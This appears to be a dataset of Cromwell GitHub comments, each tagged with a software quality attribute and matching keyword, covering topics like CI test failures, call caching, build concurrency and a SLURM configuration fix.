https://github.com/broadinstitute/cromwell/pull/6724#issuecomment-1084618151:103,Testability,test,test,103,Ugh this looks like CROM-6890 with the four PAPI Centaur builds cross talking in the `no_input_delete` test as they're all trying to write to the [same place](https://github.com/broadinstitute/cromwell/blob/develop/centaur/src/main/resources/standardTestCases/delete_intermediates/no_input_delete_setup.wdl#L12). . I'll empty-commit nudge Travis to preserve the evidence here: ; https://app.travis-ci.com/github/broadinstitute/cromwell/builds/248697843,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6724#issuecomment-1084618151
https://github.com/broadinstitute/cromwell/pull/6724#issuecomment-1091722003:63,Availability,failure,failure,63,"I've been trying to shepherd these tests through. The previous failure was fixed by CROM-6890 work, and we're now getting a new failure that looks like CROM-6872.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6724#issuecomment-1091722003
https://github.com/broadinstitute/cromwell/pull/6724#issuecomment-1091722003:128,Availability,failure,failure,128,"I've been trying to shepherd these tests through. The previous failure was fixed by CROM-6890 work, and we're now getting a new failure that looks like CROM-6872.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6724#issuecomment-1091722003
https://github.com/broadinstitute/cromwell/pull/6724#issuecomment-1091722003:35,Testability,test,tests,35,"I've been trying to shepherd these tests through. The previous failure was fixed by CROM-6890 work, and we're now getting a new failure that looks like CROM-6872.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6724#issuecomment-1091722003
https://github.com/broadinstitute/cromwell/pull/6726#issuecomment-1095067930:59,Availability,error,errors,59,"@jgainerdewar thank you, I didn't check the ""Pull Request"" errors carefully enough (thinking it was just the `ssh_access` problem)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6726#issuecomment-1095067930
https://github.com/broadinstitute/cromwell/pull/6732#issuecomment-1099408710:13,Testability,test,test,13,"Deleting the test is an option. There's enough here that, if we wanted to revive the test, I wouldn't want anyone to have to start from scratch. While we know that we could search through git history to find and revive it, someone in the future might not. I know that we've chosen to not prioritize this feature right now, but I don't think that necessarily means that we don't care about it at all.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6732#issuecomment-1099408710
https://github.com/broadinstitute/cromwell/pull/6732#issuecomment-1099408710:85,Testability,test,test,85,"Deleting the test is an option. There's enough here that, if we wanted to revive the test, I wouldn't want anyone to have to start from scratch. While we know that we could search through git history to find and revive it, someone in the future might not. I know that we've chosen to not prioritize this feature right now, but I don't think that necessarily means that we don't care about it at all.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6732#issuecomment-1099408710
https://github.com/broadinstitute/cromwell/pull/6736#issuecomment-2105391075:111,Deployability,install,install,111,"Oh, and during rebase I switched from singularity-ce to apptainer, only because the latter's fork is easier to install in 2024.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6736#issuecomment-2105391075
https://github.com/broadinstitute/cromwell/pull/6739#issuecomment-1105146934:211,Deployability,update,update,211,TOL2: Do we want to have an concurrency protection on this action (eg to run at most 1 docker build at a time?) to avoid awkward race conditions (or merge conflicts) in cromwhelm if two actions are competing to update the helm chart at the same time?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6739#issuecomment-1105146934
https://github.com/broadinstitute/cromwell/pull/6739#issuecomment-1105146934:28,Performance,concurren,concurrency,28,TOL2: Do we want to have an concurrency protection on this action (eg to run at most 1 docker build at a time?) to avoid awkward race conditions (or merge conflicts) in cromwhelm if two actions are competing to update the helm chart at the same time?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6739#issuecomment-1105146934
https://github.com/broadinstitute/cromwell/pull/6739#issuecomment-1105146934:129,Performance,race condition,race conditions,129,TOL2: Do we want to have an concurrency protection on this action (eg to run at most 1 docker build at a time?) to avoid awkward race conditions (or merge conflicts) in cromwhelm if two actions are competing to update the helm chart at the same time?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6739#issuecomment-1105146934
https://github.com/broadinstitute/cromwell/pull/6739#issuecomment-1105146934:115,Safety,avoid,avoid,115,TOL2: Do we want to have an concurrency protection on this action (eg to run at most 1 docker build at a time?) to avoid awkward race conditions (or merge conflicts) in cromwhelm if two actions are competing to update the helm chart at the same time?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6739#issuecomment-1105146934
https://github.com/broadinstitute/cromwell/pull/6739#issuecomment-1105713043:207,Deployability,update,update,207,"> Do we want to have an concurrency protection on this action (eg to run at most 1 docker build at a time?) to avoid awkward race conditions (or merge conflicts) in cromwhelm if two actions are competing to update the helm chart at the same time?. I have been exercising this condition fairly regularly over the last few days while pushing changes and it doesn't seem to cause any problems. The build takes a consistent 6 minutes; if I push 3 changes at 1 minute increments, the builds run on parallel nodes and finish in the order they started.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6739#issuecomment-1105713043
https://github.com/broadinstitute/cromwell/pull/6739#issuecomment-1105713043:24,Performance,concurren,concurrency,24,"> Do we want to have an concurrency protection on this action (eg to run at most 1 docker build at a time?) to avoid awkward race conditions (or merge conflicts) in cromwhelm if two actions are competing to update the helm chart at the same time?. I have been exercising this condition fairly regularly over the last few days while pushing changes and it doesn't seem to cause any problems. The build takes a consistent 6 minutes; if I push 3 changes at 1 minute increments, the builds run on parallel nodes and finish in the order they started.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6739#issuecomment-1105713043
https://github.com/broadinstitute/cromwell/pull/6739#issuecomment-1105713043:125,Performance,race condition,race conditions,125,"> Do we want to have an concurrency protection on this action (eg to run at most 1 docker build at a time?) to avoid awkward race conditions (or merge conflicts) in cromwhelm if two actions are competing to update the helm chart at the same time?. I have been exercising this condition fairly regularly over the last few days while pushing changes and it doesn't seem to cause any problems. The build takes a consistent 6 minutes; if I push 3 changes at 1 minute increments, the builds run on parallel nodes and finish in the order they started.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6739#issuecomment-1105713043
https://github.com/broadinstitute/cromwell/pull/6739#issuecomment-1105713043:111,Safety,avoid,avoid,111,"> Do we want to have an concurrency protection on this action (eg to run at most 1 docker build at a time?) to avoid awkward race conditions (or merge conflicts) in cromwhelm if two actions are competing to update the helm chart at the same time?. I have been exercising this condition fairly regularly over the last few days while pushing changes and it doesn't seem to cause any problems. The build takes a consistent 6 minutes; if I push 3 changes at 1 minute increments, the builds run on parallel nodes and finish in the order they started.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6739#issuecomment-1105713043
https://github.com/broadinstitute/cromwell/pull/6741#issuecomment-2105115430:103,Testability,test,tests,103,"@kshakir I migrated the old CROM-2620 ticket to our new Jira project, you should be good to merge once tests finish.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6741#issuecomment-2105115430
https://github.com/broadinstitute/cromwell/pull/6742#issuecomment-1108047748:191,Availability,down,down,191,"Currently only a draft since I'd like to hear from others:; - how deeply folks want this CI tested (is a unit test using mock auth enough?); - if folks think this copied code should be moved down into the standard backends, since GAR/GAR can be public-but-authenticated just like DockerHub, Quay, etc",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6742#issuecomment-1108047748
https://github.com/broadinstitute/cromwell/pull/6742#issuecomment-1108047748:256,Security,authenticat,authenticated,256,"Currently only a draft since I'd like to hear from others:; - how deeply folks want this CI tested (is a unit test using mock auth enough?); - if folks think this copied code should be moved down into the standard backends, since GAR/GAR can be public-but-authenticated just like DockerHub, Quay, etc",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6742#issuecomment-1108047748
https://github.com/broadinstitute/cromwell/pull/6742#issuecomment-1108047748:92,Testability,test,tested,92,"Currently only a draft since I'd like to hear from others:; - how deeply folks want this CI tested (is a unit test using mock auth enough?); - if folks think this copied code should be moved down into the standard backends, since GAR/GAR can be public-but-authenticated just like DockerHub, Quay, etc",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6742#issuecomment-1108047748
https://github.com/broadinstitute/cromwell/pull/6742#issuecomment-1108047748:110,Testability,test,test,110,"Currently only a draft since I'd like to hear from others:; - how deeply folks want this CI tested (is a unit test using mock auth enough?); - if folks think this copied code should be moved down into the standard backends, since GAR/GAR can be public-but-authenticated just like DockerHub, Quay, etc",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6742#issuecomment-1108047748
https://github.com/broadinstitute/cromwell/pull/6742#issuecomment-1108047748:121,Testability,mock,mock,121,"Currently only a draft since I'd like to hear from others:; - how deeply folks want this CI tested (is a unit test using mock auth enough?); - if folks think this copied code should be moved down into the standard backends, since GAR/GAR can be public-but-authenticated just like DockerHub, Quay, etc",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6742#issuecomment-1108047748
https://github.com/broadinstitute/cromwell/pull/6743#issuecomment-1112495472:93,Availability,avail,available,93,"OK, I won't notify you again about this release, but will get in touch when a new version is available. If you'd rather skip all updates until the next major or minor version, let me know by commenting `@dependabot ignore this major version` or `@dependabot ignore this minor version`. If you change your mind, just re-open this PR and I'll resolve any conflicts on it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6743#issuecomment-1112495472
https://github.com/broadinstitute/cromwell/pull/6743#issuecomment-1112495472:40,Deployability,release,release,40,"OK, I won't notify you again about this release, but will get in touch when a new version is available. If you'd rather skip all updates until the next major or minor version, let me know by commenting `@dependabot ignore this major version` or `@dependabot ignore this minor version`. If you change your mind, just re-open this PR and I'll resolve any conflicts on it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6743#issuecomment-1112495472
https://github.com/broadinstitute/cromwell/pull/6743#issuecomment-1112495472:129,Deployability,update,updates,129,"OK, I won't notify you again about this release, but will get in touch when a new version is available. If you'd rather skip all updates until the next major or minor version, let me know by commenting `@dependabot ignore this major version` or `@dependabot ignore this minor version`. If you change your mind, just re-open this PR and I'll resolve any conflicts on it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6743#issuecomment-1112495472
https://github.com/broadinstitute/cromwell/pull/6743#issuecomment-1112495472:204,Integrability,depend,dependabot,204,"OK, I won't notify you again about this release, but will get in touch when a new version is available. If you'd rather skip all updates until the next major or minor version, let me know by commenting `@dependabot ignore this major version` or `@dependabot ignore this minor version`. If you change your mind, just re-open this PR and I'll resolve any conflicts on it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6743#issuecomment-1112495472
https://github.com/broadinstitute/cromwell/pull/6743#issuecomment-1112495472:247,Integrability,depend,dependabot,247,"OK, I won't notify you again about this release, but will get in touch when a new version is available. If you'd rather skip all updates until the next major or minor version, let me know by commenting `@dependabot ignore this major version` or `@dependabot ignore this minor version`. If you change your mind, just re-open this PR and I'll resolve any conflicts on it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6743#issuecomment-1112495472
https://github.com/broadinstitute/cromwell/issues/6744#issuecomment-2118191458:28,Availability,error,error,28,I also encountered the same error. Could anyone make some comments?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6744#issuecomment-2118191458
https://github.com/broadinstitute/cromwell/pull/6749#issuecomment-1113676440:34,Testability,test,tests,34,Paired with Katrina on fixing the tests. Will review once the changes are committed.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6749#issuecomment-1113676440
https://github.com/broadinstitute/cromwell/issues/6752#issuecomment-1116250707:86,Performance,cache,cache,86,You can create a new submission with the same inputs and Cromwell will read from call-cache (i.e. skip) tasks it has already done. https://cromwell.readthedocs.io/en/stable/cromwell_features/CallCaching/; https://support.terra.bio/hc/en-us/articles/360047664872-Call-caching-How-it-works-and-when-to-use-it,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6752#issuecomment-1116250707
https://github.com/broadinstitute/cromwell/issues/6752#issuecomment-1116276070:88,Performance,cache,cache,88,"> You can create a new submission with the same inputs and Cromwell will read from call-cache (i.e. skip) tasks it has already done.; > ; > https://cromwell.readthedocs.io/en/stable/cromwell_features/CallCaching/ https://support.terra.bio/hc/en-us/articles/360047664872-Call-caching-How-it-works-and-when-to-use-it. ah I see, thanks for pointing me here",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6752#issuecomment-1116276070
https://github.com/broadinstitute/cromwell/issues/6756#issuecomment-1158965833:408,Availability,down,downstream,408,"It is not about cromwell subscribing its own events. As u already said, cromwell has exposed restful api for external integration, so it is your job to monitor workflow status as u want such as maintaining an event system like influxdb. Say, you can setup a telegraf exec plugin for polling cromwell server periodically and streaming status into infuxdb, then use influxdb as an event system and trigger all downstream actions once status is changed, you can even setup a grafana as dashboard of workflows monitor system. Or if your crowmwell server can be accessed via internet, the easier way is to poll it from AWS lambda and put workflow status to aws SQS or SNS.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6756#issuecomment-1158965833
https://github.com/broadinstitute/cromwell/issues/6756#issuecomment-1158965833:118,Deployability,integrat,integration,118,"It is not about cromwell subscribing its own events. As u already said, cromwell has exposed restful api for external integration, so it is your job to monitor workflow status as u want such as maintaining an event system like influxdb. Say, you can setup a telegraf exec plugin for polling cromwell server periodically and streaming status into infuxdb, then use influxdb as an event system and trigger all downstream actions once status is changed, you can even setup a grafana as dashboard of workflows monitor system. Or if your crowmwell server can be accessed via internet, the easier way is to poll it from AWS lambda and put workflow status to aws SQS or SNS.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6756#issuecomment-1158965833
https://github.com/broadinstitute/cromwell/issues/6756#issuecomment-1158965833:152,Energy Efficiency,monitor,monitor,152,"It is not about cromwell subscribing its own events. As u already said, cromwell has exposed restful api for external integration, so it is your job to monitor workflow status as u want such as maintaining an event system like influxdb. Say, you can setup a telegraf exec plugin for polling cromwell server periodically and streaming status into infuxdb, then use influxdb as an event system and trigger all downstream actions once status is changed, you can even setup a grafana as dashboard of workflows monitor system. Or if your crowmwell server can be accessed via internet, the easier way is to poll it from AWS lambda and put workflow status to aws SQS or SNS.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6756#issuecomment-1158965833
https://github.com/broadinstitute/cromwell/issues/6756#issuecomment-1158965833:506,Energy Efficiency,monitor,monitor,506,"It is not about cromwell subscribing its own events. As u already said, cromwell has exposed restful api for external integration, so it is your job to monitor workflow status as u want such as maintaining an event system like influxdb. Say, you can setup a telegraf exec plugin for polling cromwell server periodically and streaming status into infuxdb, then use influxdb as an event system and trigger all downstream actions once status is changed, you can even setup a grafana as dashboard of workflows monitor system. Or if your crowmwell server can be accessed via internet, the easier way is to poll it from AWS lambda and put workflow status to aws SQS or SNS.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6756#issuecomment-1158965833
https://github.com/broadinstitute/cromwell/issues/6756#issuecomment-1158965833:118,Integrability,integrat,integration,118,"It is not about cromwell subscribing its own events. As u already said, cromwell has exposed restful api for external integration, so it is your job to monitor workflow status as u want such as maintaining an event system like influxdb. Say, you can setup a telegraf exec plugin for polling cromwell server periodically and streaming status into infuxdb, then use influxdb as an event system and trigger all downstream actions once status is changed, you can even setup a grafana as dashboard of workflows monitor system. Or if your crowmwell server can be accessed via internet, the easier way is to poll it from AWS lambda and put workflow status to aws SQS or SNS.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6756#issuecomment-1158965833
https://github.com/broadinstitute/cromwell/issues/6756#issuecomment-1158965833:272,Modifiability,plugin,plugin,272,"It is not about cromwell subscribing its own events. As u already said, cromwell has exposed restful api for external integration, so it is your job to monitor workflow status as u want such as maintaining an event system like influxdb. Say, you can setup a telegraf exec plugin for polling cromwell server periodically and streaming status into infuxdb, then use influxdb as an event system and trigger all downstream actions once status is changed, you can even setup a grafana as dashboard of workflows monitor system. Or if your crowmwell server can be accessed via internet, the easier way is to poll it from AWS lambda and put workflow status to aws SQS or SNS.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6756#issuecomment-1158965833
https://github.com/broadinstitute/cromwell/issues/6756#issuecomment-1158965833:85,Security,expose,exposed,85,"It is not about cromwell subscribing its own events. As u already said, cromwell has exposed restful api for external integration, so it is your job to monitor workflow status as u want such as maintaining an event system like influxdb. Say, you can setup a telegraf exec plugin for polling cromwell server periodically and streaming status into infuxdb, then use influxdb as an event system and trigger all downstream actions once status is changed, you can even setup a grafana as dashboard of workflows monitor system. Or if your crowmwell server can be accessed via internet, the easier way is to poll it from AWS lambda and put workflow status to aws SQS or SNS.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6756#issuecomment-1158965833
https://github.com/broadinstitute/cromwell/issues/6756#issuecomment-1158965833:557,Security,access,accessed,557,"It is not about cromwell subscribing its own events. As u already said, cromwell has exposed restful api for external integration, so it is your job to monitor workflow status as u want such as maintaining an event system like influxdb. Say, you can setup a telegraf exec plugin for polling cromwell server periodically and streaming status into infuxdb, then use influxdb as an event system and trigger all downstream actions once status is changed, you can even setup a grafana as dashboard of workflows monitor system. Or if your crowmwell server can be accessed via internet, the easier way is to poll it from AWS lambda and put workflow status to aws SQS or SNS.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6756#issuecomment-1158965833
https://github.com/broadinstitute/cromwell/issues/6757#issuecomment-1137137019:40,Deployability,configurat,configuration,40,"The issue was solved by adding cromwell configuration shown in **bold**:. backend {; providers {; slurm {; config {; **temporary-directory = ""/scratch/slurm/$SLURM_JOB_ID""**; submit-docker = """"""; sbatch \; --wrap ""singularity exec **-B /scratch**""; """"; }; }; }; }",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6757#issuecomment-1137137019
https://github.com/broadinstitute/cromwell/issues/6757#issuecomment-1137137019:208,Integrability,wrap,wrap,208,"The issue was solved by adding cromwell configuration shown in **bold**:. backend {; providers {; slurm {; config {; **temporary-directory = ""/scratch/slurm/$SLURM_JOB_ID""**; submit-docker = """"""; sbatch \; --wrap ""singularity exec **-B /scratch**""; """"; }; }; }; }",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6757#issuecomment-1137137019
https://github.com/broadinstitute/cromwell/issues/6757#issuecomment-1137137019:40,Modifiability,config,configuration,40,"The issue was solved by adding cromwell configuration shown in **bold**:. backend {; providers {; slurm {; config {; **temporary-directory = ""/scratch/slurm/$SLURM_JOB_ID""**; submit-docker = """"""; sbatch \; --wrap ""singularity exec **-B /scratch**""; """"; }; }; }; }",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6757#issuecomment-1137137019
https://github.com/broadinstitute/cromwell/issues/6757#issuecomment-1137137019:107,Modifiability,config,config,107,"The issue was solved by adding cromwell configuration shown in **bold**:. backend {; providers {; slurm {; config {; **temporary-directory = ""/scratch/slurm/$SLURM_JOB_ID""**; submit-docker = """"""; sbatch \; --wrap ""singularity exec **-B /scratch**""; """"; }; }; }; }",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6757#issuecomment-1137137019
https://github.com/broadinstitute/cromwell/pull/6762#issuecomment-1127165933:288,Deployability,pipeline,pipelines,288,"Cromwell communicates with various gcloud endpoints. Instead of having N creds for N endpoints, sometimes Cromwell reuses creds for something else. For example: using the GCS creds for docker hash lookups [here](https://github.com/broadinstitute/cromwell/blob/78/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/PipelinesApiBackendLifecycleActorFactory.scala#L70-L82). This PR adds an optional config for reference disk validation auth falling back to the `genomics` auth that was used previously. One can then use USA authentication for individual genomics calls and a separate system SA for verifying which of the reference disks are valid (at startup).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6762#issuecomment-1127165933
https://github.com/broadinstitute/cromwell/pull/6762#issuecomment-1127165933:344,Deployability,pipeline,pipelines,344,"Cromwell communicates with various gcloud endpoints. Instead of having N creds for N endpoints, sometimes Cromwell reuses creds for something else. For example: using the GCS creds for docker hash lookups [here](https://github.com/broadinstitute/cromwell/blob/78/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/PipelinesApiBackendLifecycleActorFactory.scala#L70-L82). This PR adds an optional config for reference disk validation auth falling back to the `genomics` auth that was used previously. One can then use USA authentication for individual genomics calls and a separate system SA for verifying which of the reference disks are valid (at startup).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6762#issuecomment-1127165933
https://github.com/broadinstitute/cromwell/pull/6762#issuecomment-1127165933:361,Deployability,Pipeline,PipelinesApiBackendLifecycleActorFactory,361,"Cromwell communicates with various gcloud endpoints. Instead of having N creds for N endpoints, sometimes Cromwell reuses creds for something else. For example: using the GCS creds for docker hash lookups [here](https://github.com/broadinstitute/cromwell/blob/78/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/PipelinesApiBackendLifecycleActorFactory.scala#L70-L82). This PR adds an optional config for reference disk validation auth falling back to the `genomics` auth that was used previously. One can then use USA authentication for individual genomics calls and a separate system SA for verifying which of the reference disks are valid (at startup).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6762#issuecomment-1127165933
https://github.com/broadinstitute/cromwell/pull/6762#issuecomment-1127165933:443,Modifiability,config,config,443,"Cromwell communicates with various gcloud endpoints. Instead of having N creds for N endpoints, sometimes Cromwell reuses creds for something else. For example: using the GCS creds for docker hash lookups [here](https://github.com/broadinstitute/cromwell/blob/78/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/PipelinesApiBackendLifecycleActorFactory.scala#L70-L82). This PR adds an optional config for reference disk validation auth falling back to the `genomics` auth that was used previously. One can then use USA authentication for individual genomics calls and a separate system SA for verifying which of the reference disks are valid (at startup).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6762#issuecomment-1127165933
https://github.com/broadinstitute/cromwell/pull/6762#issuecomment-1127165933:192,Security,hash,hash,192,"Cromwell communicates with various gcloud endpoints. Instead of having N creds for N endpoints, sometimes Cromwell reuses creds for something else. For example: using the GCS creds for docker hash lookups [here](https://github.com/broadinstitute/cromwell/blob/78/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/PipelinesApiBackendLifecycleActorFactory.scala#L70-L82). This PR adds an optional config for reference disk validation auth falling back to the `genomics` auth that was used previously. One can then use USA authentication for individual genomics calls and a separate system SA for verifying which of the reference disks are valid (at startup).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6762#issuecomment-1127165933
https://github.com/broadinstitute/cromwell/pull/6762#issuecomment-1127165933:469,Security,validat,validation,469,"Cromwell communicates with various gcloud endpoints. Instead of having N creds for N endpoints, sometimes Cromwell reuses creds for something else. For example: using the GCS creds for docker hash lookups [here](https://github.com/broadinstitute/cromwell/blob/78/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/PipelinesApiBackendLifecycleActorFactory.scala#L70-L82). This PR adds an optional config for reference disk validation auth falling back to the `genomics` auth that was used previously. One can then use USA authentication for individual genomics calls and a separate system SA for verifying which of the reference disks are valid (at startup).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6762#issuecomment-1127165933
https://github.com/broadinstitute/cromwell/pull/6762#issuecomment-1127165933:568,Security,authenticat,authentication,568,"Cromwell communicates with various gcloud endpoints. Instead of having N creds for N endpoints, sometimes Cromwell reuses creds for something else. For example: using the GCS creds for docker hash lookups [here](https://github.com/broadinstitute/cromwell/blob/78/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/PipelinesApiBackendLifecycleActorFactory.scala#L70-L82). This PR adds an optional config for reference disk validation auth falling back to the `genomics` auth that was used previously. One can then use USA authentication for individual genomics calls and a separate system SA for verifying which of the reference disks are valid (at startup).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6762#issuecomment-1127165933
https://github.com/broadinstitute/cromwell/pull/6762#issuecomment-2105413034:39,Deployability,integrat,integration,39,"If the direction is ok, I can add unit/integration tests.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6762#issuecomment-2105413034
https://github.com/broadinstitute/cromwell/pull/6762#issuecomment-2105413034:39,Integrability,integrat,integration,39,"If the direction is ok, I can add unit/integration tests.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6762#issuecomment-2105413034
https://github.com/broadinstitute/cromwell/pull/6762#issuecomment-2105413034:51,Testability,test,tests,51,"If the direction is ok, I can add unit/integration tests.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6762#issuecomment-2105413034
https://github.com/broadinstitute/cromwell/pull/6762#issuecomment-2107597421:161,Availability,mainten,maintenance-intensive,161,"I think we're looking to freeze GCP changes for now due the imminent migration to GCP Batch. We're also not sure if reference disks are staying around, they are maintenance-intensive in Terra.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6762#issuecomment-2107597421
